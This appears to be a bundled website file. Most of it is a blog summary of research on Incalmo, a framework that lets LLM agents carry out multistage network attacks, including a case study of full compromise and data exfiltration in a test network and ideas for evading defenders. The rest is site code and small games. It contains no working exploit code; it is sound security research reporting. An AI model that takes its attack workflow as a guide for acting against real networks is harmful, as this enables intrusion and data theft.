<p>Together, these abstractions allow the LLM to focus on what to do next at a high level, while Incalmo handles how to do it. The LLM’s “language” for interacting with the environment becomes a set of high-level actions and queries, rather than raw shell syntax. This dramatically reduces the chances of syntax errors or irrelevant exploits – the LLM can’t easily go off-script because its choices are constrained to meaningful tasks.</p>
<h3>Using Incalmo</h3>
<p>The workflow involves a preparation phase and an execution loop:</p>
<ol>
<li>
<p><strong>Onboarding Prompt:</strong> First, the LLM is primed with an onboarding prompt that teaches it how to use Incalmo. This prompt describes the available high-level tasks (the “API” of the action planner) and how to ask the attack graph or state services questions. Essentially, the LLM learns it has a special toolkit and must output actions in a structured format.</p>
</li>
<li>
<p><strong>Environment &amp; Goal Context:</strong> The LLM is then given environment-specific details and objectives. For each scenario, a prompt describes the target network (e.g., how many subnets, what is initially known) and the attack goal (e.g., “exfiltrate all customer records from the databases”). This contextual grounding ensures the LLM knows the mission and starting point.</p>
</li>
<li>
<p><strong>Iterative Execution Loop:</strong> Finally, the LLM enters an autonomous loop where it iteratively decides on a task to perform, Incalmo executes it, and the results are fed back for the LLM to analyze. For example, the LLM might output: <code>Action: scan_network(target=10.0.0.0/16)</code>. Incalmo’s action planner takes that and runs the appropriate <code>nmap</code> commands under the hood. The output (say, a list of discovered hosts and open ports) is then returned to the LLM (likely in a summarized form via the state service). The LLM reads the results and then decides the next high-level action. This cycle continues until the LLM believes it has achieved the goal or exhausts a time/step limit.</p>
</li>
</ol>
<p>By structuring the interaction in this manner, Incalmo essentially plays the role of an expert red-team operator executing the LLM’s ideas correctly and keeping it on track. It is worth noting that Incalmo is LLM-agnostic – it acts as a universal interface that could work with any language model, by providing the same high-level “attack API.” It does not modify the LLM’s internals; it only changes the prompts and the execution medium.</p>
<hr />
<h2>Case Study: LLM + Incalmo in Action</h2>
<p>To illustrate how an LLM attacks a network using Incalmo, the paper walks through a case study in the <strong>Equifax-inspired</strong> environment using the <strong>Sonnet 3.5</strong> model. This example highlights how the LLM, empowered by Incalmo, can carry out a full multistage attack that it could not achieve alone. The high-level steps include reconnaissance, initial exploitation, credential gathering, lateral movement, and data exfiltration:</p>
<ul>
<li>
<p><strong>External Reconnaissance:</strong> The LLM begins by scanning the target network. It issues a high-level “scan network” task via Incalmo, instructing the attack on the external IP range. Incalmo translates this into the appropriate <code>nmap</code> commands. The scan discovers two external hosts (for example, a web server and perhaps a mail server) accessible to the attacker. This information (host IPs and open ports) is added to the environment state and shared with the LLM.</p>
</li>
<li>
<p><strong>Initial Compromise:</strong> The LLM identifies the external web server as a likely entry point. It uses an “infect host” action on that server (i.e., attempt to exploit it). Incalmo’s action planner knows, from the scenario’s toolkit, which exploit to try (the Equifax scenario is designed to match a vulnerability chain described in public analyses). It executes the exploit and succeeds in gaining access to the web server (now a foothold inside the network). The environment state service updates the knowledge base: the attacker now has a shell on Host X.</p>
</li>
<li>
<p><strong>Post-Exploitation &amp; Credential Harvesting:</strong> With a presence on the web server, the LLM wants to expand its access. It issues a “find information on host” task for the compromised server – essentially a search for useful data like credentials, config files, etc. Incalmo carries this out (running a script to enumerate key directories, password files, etc.). This yields a valuable find: SSH credentials are discovered on the web server (perhaps an admin left keys or passwords on it). These credentials are reported back to the LLM via the state service.</p>
</li>
<li>
<p><strong>Lateral Movement:</strong> Now armed with valid SSH credentials, the LLM can pivot deeper. It chooses a “lateral movement: infect another host” task, targeting one of the internal database servers (the end goal is to reach databases). Incalmo uses the credentials to SSH into a database host and then runs an exploit or privilege escalation if needed. The LLM successfully compromises a database server with this step. It then again uses the “find information” task on the newly infected database host, which finds the stored critical data (e.g., customer records) on that machine.</p>
</li>
<li>
<p><strong>Exfiltration:</strong> Having found sensitive data, the LLM invokes the “exfiltrate data” action on the database host. Incalmo handles the mechanics (perhaps compressing and exfiltrating the data to the attacker’s machine or a drop server). The result is that the LLM obtains a chunk of the target data – for instance, one database dump file is retrieved successfully. At this point, the LLM has achieved part of the goal (data from one database). In the paper’s example, this constituted <strong>1 out of 48 files</strong> (since the Equifax environment had 48 databases with critical data).</p>
</li>
<li>
<p><strong>Scaling to Full Compromise:</strong> Crucially, the LLM doesn’t stop at one file. Noticing there are more target databases, it iteratively repeats the lateral movement and exfiltration process for each remaining database server. It systematically uses the credentials or footholds obtained to move through the network, infect all 48 database hosts, locate each critical file, and exfiltrate all of them. In effect, the LLM orchestrates a complete attack graph traversal: from initial access to total data breach across dozens of hosts. Incalmo executes each step reliably, and the attack graph service could be consulted if the LLM needed to ensure it covers all goal states.</p>
</li>
</ul>
<p>By the end of this loop, Sonnet 3.5 with Incalmo has fully compromised the Equifax-like network, achieving all attack goals. This is a striking result given that the same model without Incalmo couldn’t get beyond early reconnaissance. The case study demonstrates how the combination of LLM reasoning + Incalmo’s guidance and tools yields an autonomous agent capable of multi-host operations. Notably, the LLM was even able to handle the scale (iterating 48 times) – something that often tripped up attacks without Incalmo, where agents would stop after one success (a lack of persistence). With the structured approach, the LLM remained focused until the entire attack graph was cleared.</p>
<p>It’s worth mentioning that in this example the LLM sometimes assumed the next step – it could have alternatively queried the attack graph service to double-check prerequisites. Incalmo doesn’t force the LLM’s every decision; it provides guardrails and executes requests. The LLM still drives the overall strategy, but now with a much higher success rate for each step.</p>
<hr />
<h2>Results: Incalmo Unlocks Successful Autonomous Attacks</h2>
<p>Does Incalmo actually enable LLMs to succeed broadly? The evaluation results show a resounding yes. With Incalmo in the loop, the LLMs achieved capabilities that were previously out of reach:</p>
<ul>
<li>
<p><strong>Dramatic improvement in success rate:</strong> Using Incalmo, the LLM agents managed to <strong>partially succeed in 9 out of 10 environments</strong>, and <strong>fully succeed in 5 out of 10</strong> (in at least one trial). Recall that without Incalmo, <strong>0</strong> environments saw a full success and only <strong>1</strong> saw even a partial success. The high-level takeaway: Incalmo transformed multistage attack execution from “nearly impossible” to feasible in most cases.</p>
</li>
<li>
<p><strong>Model-agnostic benefits:</strong> The performance boost applied across different LLMs, not just the largest ones. In fact, a striking finding was that a smaller LLM with Incalmo could outperform a much larger LLM without Incalmo. For example, in the 4-Layer Chain environment, the relatively smaller Haiku 3.5 model using Incalmo was able to exfiltrate all 25 files (complete success), whereas the more powerful Sonnet 3.5 without Incalmo only managed to grab 1 file (partial success). This flips the conventional wisdom that a bigger model is always better – here the quality of guidance/abstraction mattered more than brute-force model capability. In other words, high-level task abstraction was a bigger factor for success than the underlying model size.</p>
</li>
<li>
<p><strong>Key role of the Action Planner:</strong> The ablation studies demonstrated that Incalmo’s most critical component is the action planner (high-level tasks). When the authors created a variant called <strong>Incalmo-WAP (Without Action Planner)</strong> – meaning the LLM had to issue low-level commands again, though still with the help of the state/graph services – the performance collapsed. LLMs with Incalmo-WAP failed to partially complete any goals in any of the 10 environments. This finding (“Finding 2.A”) confirms that the action planner’s abstract tasks are indispensable – they handle complexity that LLMs are otherwise bad at, enabling the whole attack to proceed.</p>
</li>
<li>
<p><strong>Impact of the auxiliary services:</strong> Incalmo’s other two components – the attack graph and environment state services – also provided measurable (though more modest) improvements. In an ablation variant <strong>Incalmo-WS (Without Services)</strong>, the LLM had the action planner but could not query the services directly (though the planner itself still used them internally for environment-agnostic execution). LLMs with Incalmo-WS did have some success, showing the action planner alone is a huge help. However, the full Incalmo (with services accessible to the LLM) enabled partial or full success in <strong>1–5 additional environments</strong> compared to Incalmo-WS, depending on the model. “Finding 2.B” quantifies this: across all LLMs tested, using the environment/attack-graph services allowed the agents to succeed in up to five more scenarios than they could without those services.</p>
</li>
<li>
<p><strong>Consistency and reliability:</strong> Another aspect examined was how reliable the success was across multiple trials. With stochastic LLM outputs, an agent might succeed in one run and fail in another. The paper notes that partial success became quite reliable in several cases – e.g., Haiku 3.5 and Sonnet 3.5 (with Incalmo) achieved partial success in all 5 trials in 5 out of 10 environments. Full success was still less consistent (only one model-environment pair achieved 100% full success rate in trials: Haiku 3.5 in the Colonial Pipeline scenario, with another model getting 4/5 in Equifax). This suggests that while Incalmo greatly improves average capability, there remains some variability (likely due to the LLM sometimes deviating or stopping early). Still, the worst-case outcome with Incalmo was often at least a partial compromise, which is far better than the across-the-board failures without it.</p>
</li>
</ul>
<p>In summary, Incalmo proved effective at enabling autonomous LLM-driven attacks. Out of the original 10 scenarios, only one remained unsolved (even partially) with Incalmo – highlighting a near-complete coverage of complex attack types that were previously impossible for the LLMs. The ablation experiments reinforced why it worked: the high-level action abstraction was critical, and the structured guidance from services provided the extra edge to maximize success. These quantitative results validate the paper’s thesis that the right interface (abstractions + information) can unlock emergent capabilities in LLMs, even more so than increasing model size.</p>
<hr />
<h2>Implications for Red-Teaming and Future Directions</h2>
<p>The findings of this research have significant implications for the security community, especially in the realms of automated red-teaming and adversary emulation. If LLMs can be guided to reliably carry out multistage attacks, they could serve as force-multipliers for security testing. Organizations could potentially deploy autonomous “Attacker LLMs” to continuously probe their networks, uncover misconfigurations, and validate defense against complex attack chains – a task traditionally requiring skilled (and expensive) human red teams. The paper’s conclusion emphasizes that fully autonomous multistage attackers can enable defenders to cheaply evaluate their security posture by running frequent, thorough tests. Incalmo demonstrates one way to realize such autonomous red team agents by giving the LLM both knowledge (attack graph context) and capability (attack tools via tasks).</p>
<p>At the same time, the authors acknowledge this prospect raises safety and ethical considerations. An agent that can penetrate networks autonomously is a double-edged sword – it could help defenders find weaknesses, but it might be misused by malicious actors. In response, the research team limited Incalmo’s built-in capabilities (only five exploits were included, covering common CVEs) to reduce potential harm. They also plan responsible disclosure: notifying major LLM providers so they can implement guardrails, and releasing Incalmo and the test environments as open-source tools for research. These steps aim to ensure that the technology is used for strengthening defenses, not aiding offense. It’s a reminder that alignment and control remain crucial as we develop AI agents with offensive skills.</p>
<h3>Future Work – Incorporating Defenders</h3>
<p>A notable limitation of the current study is that the attack environments did not include active network defenses or responsive blue-team behaviors. Real networks have intrusion detection systems, firewalls, or admins watching for threats. An important next step is to evaluate how an LLM attacker would fare against an active defender – and how it might need to adapt. The authors suggest extending Incalmo to scenarios with realistic (possibly autonomous) defenders in place. This could involve teaching the LLM to evade detection (e.g., limit noisy scans, rotate tactics if an approach is blocked) or even incorporating a game-theoretic planner that accounts for likely defensive responses. Introducing a defender would also test the LLM’s ability to strategize under pressure and modify its plan, which is a much higher bar than a static environment.</p>
<h3>Enhancing Attack Graph Reasoning</h3>
<p>While the attack graph service helped keep the LLM on track, the researchers observed that LLMs did not fully utilize it in some cases. For example, several partial successes with Incalmo were due to the LLM stopping after achieving one goal (say, exfiltrating one file) even though other goals remained. Ideally, the LLM should query the attack graph or state to realize there are more targets and continue the attack. This suggests room for improvement in how the LLM reasons about the attack graph and remaining objectives. Future enhancements might involve a more explicit planning algorithm that works alongside the LLM: e.g., an external planner that monitors which goal states are still unmet and prompts the LLM to pursue them (a form of self-reflection grounded in the attack graph). Another idea is giving the LLM more training on interpreting attack graphs or outputting a plan covering all goals before execution. The general aim is to make the agent more persistent and exhaustive – qualities needed for full network compromise. The authors hypothesize that better integration of the attack graph guidance would push partial successes to full successes more consistently.</p>
<h3>Broader Applications</h3>
<p>While this work focused on attack execution, similar principles could apply to other security domains where LLMs show promise. For instance, defenses could use LLMs to summarize security logs or find anomalies, but structured tools might enhance their accuracy. On offense, LLMs have been explored for tasks like phishing or social engineering content generation, and one can imagine frameworks analogous to Incalmo that guide LLMs in those areas (ensuring, for example, that a generated phishing campaign follows a realistic multi-step playbook). Moreover, the concept of high-level interfaces for LLM agents is not limited to security – it resonates with a growing trend in AI of using tool-based agent frameworks where LLMs delegate subtasks to tools or APIs. Incalmo serves as a case study of how powerful this approach can be: by giving an LLM the right tools and structure, we see a qualitative leap in its problem-solving ability.</p>
<hr />
<h2>Conclusion</h2>
<p><em>“On the Feasibility of Using LLMs to Execute Multistage Network Attacks”</em> ultimately delivers a cautiously optimistic message. Out-of-the-box, today’s LLMs are not ready to be master hackers – they flounder on long, complex tasks. But with carefully designed scaffolding like Incalmo, they can autonomously perform sophisticated attack campaigns that were previously only the domain of skilled humans. This opens the door to automated red-teaming agents that operate continuously and help harden systems. The research also serves as a blueprint for combining formal security knowledge (attack graphs, attack libraries) with LLM intelligence to achieve goals neither could alone. For security researchers and practitioners, it’s a compelling demonstration of how AI might transform offensive security – and a reminder that we must prepare defenses accordingly. The next steps will be refining these AI attackers, pitting them against AI defenders, and ensuring that as we unleash autonomous red-team bots, we do so responsibly and for the benefit of security overall.</p>
<hr />
<h2>References</h2>
<ol>
<li>Brian Singer, Keane Lucas, Lakshmi Adiga, Meghna Jain, Lujo Bauer, Vyas Sekar. <em>On the Feasibility of Using LLMs to Execute Multistage Network Attacks.</em> arXiv:2501.16466v2, 2025.  </li>
<li>arXiv: https://arxiv.org/abs/2501.16466  </li>
<li>
<p>PDF: https://arxiv.org/pdf/2501.16466.pdf</p>
</li>
<li>
<p>PentestGPT (baseline referenced by the paper):  </p>
</li>
<li>
<p>GitHub: https://github.com/GreyDGL/PentestGPT</p>
</li>
<li>
<p>MITRE ATT&amp;CK (high-level task inspiration context):  </p>
</li>
<li>
<p>https://attack.mitre.org/</p>
</li>
<li>
<p>MITRE Caldera (referenced in the paper as related tooling / substrate):  </p>
</li>
<li>
<p>https://caldera.mitre.org/</p>
</li>
<li>
<p>HTML (ar5iv): <a href="https://ar5iv.labs.arxiv.org/html/2501.16466v4#:~:text=These%20abstractions%20enable%20Incalmo%C2%A0%20to,Incalmo%C2%A0in%20an%20iterative%20execution%20loop" target="_blank" rel="noreferrer">ar5iv.labs.arxiv.org/html/2501.16466v4</a></p>
</li>
</ol>
`,BS={llm_multistage_attacks_technical_breakdown_full:{title:"On the Feasibility of Using LLMs to Execute Multistage Network Attacks – A Technical Breakdown",slug:"llm_multistage_attacks_technical_breakdown_full",content:FS},villager_inside_out:{title:"Villager, Inside Out: FastAPI control plane + LLM task graph + MCP tool runner (with code)",slug:"villager_inside_out",content:OS},firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:RS},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:NS},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:DS},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:US},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:IS},1001:{title:"CVE-2024–1001",slug:"1001",content:MS},"0012":{title:"CVE-2024–0012",slug:"0012",content:SS},40982:{title:"CVE-2022–40982",slug:"40982",content:AS},cow:{title:"CVE-2016–5195",slug:"cow",content:CS},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:PS},23397:{title:"CVE-2023–23397",slug:"23397",content:TS},"0160":{title:"CVE-2014-0160",slug:"0160",content:wS},11882:{title:"CVE-2017-11882",slug:"11882",content:ES},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:LS},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:kS}};function zS(t){try{const n=new DOMParser().parseFromString(t,"text/html"),i=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];n.querySelectorAll(i.join(",")).forEach(o=>o.remove()),n.querySelectorAll("[style]").forEach(o=>o.removeAttribute("style"));const s=n.querySelector("h1");s&&s.remove();const r=[".blog-text","article",".blog-post-content","main"];let a=n.body;for(const o of r){const l=n.querySelector(o);if(l){a=l;break}}return a.querySelectorAll(".container").forEach(o=>{for(;o.firstChild;)o.parentNode.insertBefore(o.firstChild,o);o.remove()}),Array.from(a.querySelectorAll("h2, h3")).forEach((o,l)=>{o.id||(o.id=`section-${l+1}`)}),a.innerHTML||t}catch{return t}}function VS(){const{slug:t}=Nb(),e=BS[t],n=Wa.find(r=>r.slug===t),i=$.useMemo(()=>e?zS(e.content):"",[e]),s=()=>document.body.classList.contains("dark")?"dark":"light";return $.useEffect(()=>{const r=document.querySelector(".giscus-container");if(!r)return;r.innerHTML="";const a=document.createElement("script");return a.src="https://giscus.app/client.js",a.async=!0,a.crossOrigin="anonymous",a.setAttribute("data-giscus","true"),a.setAttribute("data-repo","Hem1700/hem1700.github.io"),a.setAttribute("data-repo-id","R_kgDONilgZg"),a.setAttribute("data-category","General"),a.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),a.setAttribute("data-mapping","pathname"),a.setAttribute("data-strict","1"),a.setAttribute("data-reactions-enabled","1"),a.setAttribute("data-emit-metadata","0"),a.setAttribute("data-input-position","top"),a.setAttribute("data-lang","en"),a.setAttribute("data-theme",s()),r.appendChild(a),()=>{r.innerHTML=""}},[t]),$.useEffect(()=>{const r=()=>{var l;const o=document.querySelector("iframe.giscus-frame");o&&((l=o.contentWindow)==null||l.postMessage({giscus:{setConfig:{theme:s()}}},"https://giscus.app"))},a=new MutationObserver(r);return a.observe(document.body,{attributes:!0,attributeFilter:["class"]}),r(),()=>a.disconnect()},[]),e?m.jsxs(m.Fragment,{children:[m.jsx("header",{className:"blog-post-header",children:m.jsxs("div",{className:"container text-center",children:[m.jsx("h1",{className:"blog-post-title",children:e.title}),n&&m.jsxs("p",{className:"blog-post-date",children:[n.date," · ",n.readTime]})]})}),m.jsxs("main",{className:"section blog-post-content container",children:[m.jsx("article",{dangerouslySetInnerHTML:{__html:i}}),m.jsx("section",{className:"comments",children:m.jsx("div",{className:"container",children:m.jsx("div",{className:"giscus-container"})})})]})]}):m.jsxs("main",{className:"section blog-post-content container",children:[m.jsx("h2",{children:"Post not found"}),m.jsx("p",{children:"Signal lost. Let’s go back."}),m.jsx(Ft,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}function HS(){return m.jsx("section",{className:"section",children:m.jsxs("div",{className:"container",children:[m.jsx("div",{className:"section-header",children:m.jsxs("div",{children:[m.jsx("div",{className:"eyebrow",children:"Featured work"}),m.jsx("h2",{className:"section-title",children:"Projects"}),m.jsx("p",{className:"section-subtitle",children:"Deployment dossiers and offensive prototypes."})]})}),m.jsx(F0,{items:N0,showHeader:!1,showViewAll:!1,showFilters:!0,showFeatured:!0,wrap:!1})]})})}function GS(){return m.jsx("section",{className:"section",children:m.jsxs("div",{className:"container",children:[m.jsx("div",{className:"section-header",children:m.jsxs("div",{children:[m.jsx("div",{className:"eyebrow",children:"Recognitions"}),m.jsx("h2",{className:"section-title",children:"Certifications"}),m.jsx("p",{className:"section-subtitle",children:"Professional credentials across security, cloud, and networking."})]})}),m.jsx(O0,{items:I0,showHeader:!1,wrap:!1})]})})}const Xn=5,im={easy:{scanLimit:3,hintThresholds:[1,3]},standard:{scanLimit:2,hintThresholds:[2,4]},hard:{scanLimit:1,hintThresholds:[3,5]}},xr=Array.from({length:Xn},(t,e)=>String.fromCharCode(65+e)),WS=new Set(["reverse","engineering","from","with","into","watchguard","firebox","kernel","linux","audit","transient","scheduler","attacks","understanding","cve","blog","server","tiny","fake"]),sm=()=>{const t={};for(let e=1;e<=Xn;e+=1)for(let n=0;n<Xn;n+=1){const i=`${xr[n]}${e}`;t[i]={status:"unknown",heat:""}}return t},jS=t=>{const i=(t||"").toLowerCase().replace(/[^a-z0-9\s]/g," ").split(/\s+/).filter(Boolean).find(s=>s.length>4&&!WS.has(s));return i?i.toUpperCase():"SIGNAL"},rm=t=>{const e=t.length?t[Math.floor(Math.random()*t.length)]:{id:"UNKNOWN",title:"Unknown intruder",year:"Unknown",severity:"Unknown",summary:"",href:""},n=Math.floor(Math.random()*Xn),i=Math.floor(Math.random()*Xn);return{entry:e,colIndex:n,rowIndex:i,key:`${xr[n]}${i+1}`}},XS=t=>t===0?{label:"direct",text:"Direct signal. Confirm with ISOLATE."}:t<=1?{label:"hot",text:"Signal spike detected."}:t<=2?{label:"warm",text:"Signal is warm."}:t<=3?{label:"cool",text:"Signal is faint."}:{label:"cold",text:"Signal cold."},Vc=t=>[{type:"system",text:"NODE HUNT // Threat hunting console online."},{type:"system",text:"Type HELP to see commands."},{type:"info",text:`Grid ${Xn}x${Xn} loaded. Scan budget: ${t}.`}];function am({entries:t=[],difficulty:e="standard"}){var X,D,N;const n=im[e]||im.standard,[i,s]=$.useState(()=>sm()),[r,a]=$.useState(()=>rm(t)),[o,l]=$.useState(()=>Vc(n.scanLimit)),[c,h]=$.useState(""),[d,p]=$.useState(0),[f,y]=$.useState(0),[_,g]=$.useState(n.scanLimit),[u,v]=$.useState("active"),x=$.useRef(null),S=$.useMemo(()=>{var O,B,J,oe;return{year:((O=r.entry)==null?void 0:O.year)||"Unknown",severity:((B=r.entry)==null?void 0:B.severity)||"Unknown",keyword:jS(`${((J=r.entry)==null?void 0:J.title)||""} ${((oe=r.entry)==null?void 0:oe.summary)||""}`)}},[r]);$.useEffect(()=>{x.current&&(x.current.scrollTop=x.current.scrollHeight)},[o]);const E=(O,B="info")=>{l(J=>[...J,{type:B,text:O}])},A=()=>{s(sm()),a(rm(t)),p(0),y(0),g(n.scanLimit),v("active"),l([...Vc(n.scanLimit),{type:"system",text:"New hunt initialized."}])};$.useEffect(()=>{A()},[e]);const C=O=>{const B=O==null?void 0:O.toUpperCase().match(/^([A-Z])(\d+)$/);if(!B)return null;const J=B[1],oe=Number(B[2]),ge=xr.indexOf(J);return ge===-1||!Number.isFinite(oe)||oe<1||oe>Xn?null:{key:`${J}${oe}`,colIndex:ge,rowIndex:oe-1}},L=O=>{const[B,J]=n.hintThresholds;f===0&&O>=B?(y(1),E(`Hint: Signal spikes in row ${r.rowIndex+1}.`,"hint")):f===1&&O>=J&&(y(2),E(`Hint: Signal concentrates in column ${xr[r.colIndex]}.`,"hint"))},w=()=>{if(_<=0){E("Scan budget depleted. Use PING or TRACE.","warning");return}g(J=>Math.max(J-1,0));const O=r.rowIndex<Xn/2?"NORTH":"SOUTH",B=r.colIndex<Xn/2?"WEST":"EAST";E(`Scan result: signal cluster in ${O}-${B} quadrant.`,"info")},M=O=>{const B=Math.abs(O.colIndex-r.colIndex)+Math.abs(O.rowIndex-r.rowIndex),J=XS(B);s(oe=>({...oe,[O.key]:{status:"ping",heat:J.label}})),E(`Ping ${O.key}: ${J.text}`,"info")},k=O=>{const B=r.rowIndex===O.rowIndex?"SAME ROW":r.rowIndex<O.rowIndex?"NORTH":"SOUTH",J=r.colIndex===O.colIndex?"SAME COLUMN":r.colIndex<O.colIndex?"WEST":"EAST",oe=B==="SAME ROW"&&J==="SAME COLUMN"?"LOCK POSSIBLE":B==="SAME ROW"?J:J==="SAME COLUMN"?B:`${B}-${J}`;s(ge=>({...ge,[O.key]:{status:"trace",heat:""}})),E(`Trace ${O.key}: target heading ${oe}.`,"info")},H=O=>{var J;const B=d+1;if(p(B),O.key===r.key){s(oe=>({...oe,[O.key]:{status:"hit",heat:"hot"}})),v("found"),E(`Target isolated at ${O.key}.`,"success"),E(`Identity confirmed: ${((J=r.entry)==null?void 0:J.id)||"Unknown"}.`,"success");return}s(oe=>({...oe,[O.key]:{status:"miss",heat:"cold"}})),E(`Isolate ${O.key}: no match.`,"warning"),L(B)},V=O=>{var Ye;const B=O.trim();if(!B)return;E(`> ${B}`,"command");const[J,oe]=B.split(/\s+/),ge=J.toLowerCase(),ze=oe||"";if(u==="found"&&!["restart","help","clear","open"].includes(ge)){E("Case closed. Type RESTART to hunt again.","system");return}if(ge==="help"){E("Commands: SCAN, PING A1, TRACE B2, ISOLATE C3, OPEN, CLEAR, RESTART.","system");return}if(ge==="scan"){w();return}if(ge==="clear"){l([...Vc(n.scanLimit),{type:"system",text:"Console cleared."}]);return}if(ge==="restart"){A();return}if(ge==="open"){if(u!=="found"||!((Ye=r.entry)!=null&&Ye.href)){E("No report unlocked yet.","warning");return}window.open(r.entry.href,"_blank","noreferrer"),E("Opening report in new tab.","system");return}if(["ping","trace","isolate"].includes(ge)){const Z=C(ze);if(!Z){E("Invalid coordinate. Example: PING B2.","error");return}ge==="ping"&&M(Z),ge==="trace"&&k(Z),ge==="isolate"&&H(Z);return}E("Unknown command. Type HELP.","error")},W=O=>{O.preventDefault(),V(c),h("")},j=O=>O.status==="hit"?"@":O.status==="miss"?"x":O.status==="trace"?"+":O.status==="ping"?"o":".";return m.jsxs("div",{className:"hunt-layout",children:[m.jsxs("div",{className:`hunt-terminal ${u==="found"?"win":""}`,children:[m.jsxs("div",{className:"terminal-header",children:[m.jsxs("div",{children:[m.jsx("div",{className:"terminal-title",children:"NODE HUNT"}),m.jsx("div",{className:"terminal-subtitle",children:"Threat hunting simulation"})]}),m.jsx("div",{className:`terminal-status ${u}`,children:u==="found"?"SECURED":"ACTIVE"})]}),m.jsxs("div",{className:"hunt-onboarding",children:[m.jsx("div",{className:"onboarding-title",children:"How to play"}),m.jsxs("div",{className:"onboarding-steps",children:[m.jsxs("div",{children:["1. SCAN (",n.scanLimit,"x) to get the quadrant."]}),m.jsx("div",{children:"2. PING A1 for heat distance."}),m.jsx("div",{children:"3. TRACE B2 for direction."}),m.jsx("div",{children:"4. ISOLATE when you are confident."})]}),m.jsx("div",{className:"onboarding-hint",children:"Try: SCAN, PING B2, TRACE C4, ISOLATE D5."})]}),m.jsx("div",{className:"terminal-log",ref:x,children:o.map((O,B)=>m.jsx("div",{className:`terminal-line ${O.type}`,children:O.text},`${O.type}-${B}`))}),m.jsxs("form",{className:"terminal-input",onSubmit:W,children:[m.jsx("span",{className:"terminal-prompt",children:"nodehunt>"}),m.jsx("input",{type:"text",value:c,onChange:O=>h(O.target.value),placeholder:"Type a command (HELP)","aria-label":"Terminal command"}),m.jsx("button",{className:"pill",type:"submit",children:"Run"})]})]}),m.jsxs("div",{className:`hunt-board ${u==="found"?"win":""}`,children:[m.jsxs("div",{className:"hunt-intel",children:[m.jsx("div",{className:"intel-title",children:"Signal fingerprint"}),m.jsxs("div",{className:"intel-row",children:[m.jsx("span",{children:"Year"}),m.jsx("span",{children:S.year})]}),m.jsxs("div",{className:"intel-row",children:[m.jsx("span",{children:"Severity"}),m.jsx("span",{children:S.severity})]}),m.jsxs("div",{className:"intel-row",children:[m.jsx("span",{children:"Codename"}),m.jsx("span",{children:S.keyword})]}),m.jsxs("div",{className:"intel-row",children:[m.jsx("span",{children:"Attempts"}),m.jsx("span",{children:d})]}),m.jsxs("div",{className:"intel-row",children:[m.jsx("span",{children:"Scans left"}),m.jsx("span",{children:_})]})]}),m.jsxs("div",{className:"hunt-grid",children:[m.jsxs("div",{className:"grid-row",children:[m.jsx("div",{className:"grid-cell header"}),xr.map(O=>m.jsx("div",{className:"grid-cell header",children:O},O))]}),Array.from({length:Xn}).map((O,B)=>m.jsxs("div",{className:"grid-row",children:[m.jsx("div",{className:"grid-cell header",children:B+1}),xr.map(J=>{const oe=`${J}${B+1}`,ge=i[oe],ze=ge.heat?`heat-${ge.heat}`:"";return m.jsx("div",{className:`grid-cell cell ${ge.status} ${ze}`,children:j(ge)},oe)})]},`row-${B}`))]}),m.jsxs("div",{className:"hunt-legend",children:[m.jsxs("div",{children:[m.jsx("span",{className:"legend-symbol",children:"."})," unknown"]}),m.jsxs("div",{children:[m.jsx("span",{className:"legend-symbol",children:"o"})," ping"]}),m.jsxs("div",{children:[m.jsx("span",{className:"legend-symbol",children:"+"})," trace"]}),m.jsxs("div",{children:[m.jsx("span",{className:"legend-symbol",children:"x"})," miss"]}),m.jsxs("div",{children:[m.jsx("span",{className:"legend-symbol",children:"@"})," capture"]})]}),u==="found"&&m.jsxs("div",{className:"hunt-result",children:[m.jsx("div",{className:"hunt-result-title",children:"Intruder identified"}),m.jsx("div",{className:"hunt-result-id",children:((X=r.entry)==null?void 0:X.id)||"Unknown"}),m.jsx("p",{className:"hunt-result-text",children:(D=r.entry)==null?void 0:D.title}),((N=r.entry)==null?void 0:N.href)&&m.jsx("a",{className:"button primary",href:r.entry.href,target:"_blank",rel:"noreferrer",children:"Open report"})]})]})]})}const bi=["Alpha","Bravo","Charlie"],om={easy:{scanBase:3,scanAfterMiss:2,missPenaltyAt:3,captureGoal:2},standard:{scanBase:2,scanAfterMiss:1,missPenaltyAt:2,captureGoal:3},hard:{scanBase:2,scanAfterMiss:1,missPenaltyAt:1,captureGoal:4}},qS=t=>om[t]||om.standard,Co=(t,e)=>t>=e.missPenaltyAt?e.scanAfterMiss:e.scanBase,Hc=t=>t.length?t[Math.floor(Math.random()*t.length)]:{id:"UNKNOWN",title:"Unknown packet stream",year:"Unknown",severity:"Unknown",summary:"",href:""},Gc=t=>{const n=(((t==null?void 0:t.id)||(t==null?void 0:t.title)||"").match(/\d/g)||[]).reduce((i,s)=>i+Number(s),0);return Number.isFinite(n)?n%10:Math.floor(Math.random()*10)},ta=(t,e)=>Math.floor(Math.random()*(e-t+1))+t,Ro=t=>{const e=Math.floor(Math.random()*bi.length);return{packets:bi.map((i,s)=>{const r=s===e?t:ta(0,9),a=s===e?ta(70,96):ta(25,75);return{lane:i,checksum:r===t&&s!==e?(r+1)%10:r,latency:ta(18,90),burst:ta(2,9),risk:a}}),maliciousLane:e}},Wc=t=>[{type:"system",text:"PACKET INTERCEPT // Traffic control engaged."},{type:"system",text:"Inspect lanes, then intercept the hostile payload."},{type:"info",text:`Scan budget: ${t.scanBase} per round. Misses drop it to ${t.scanAfterMiss}.`}];function YS({entries:t=[],difficulty:e="standard"}){const 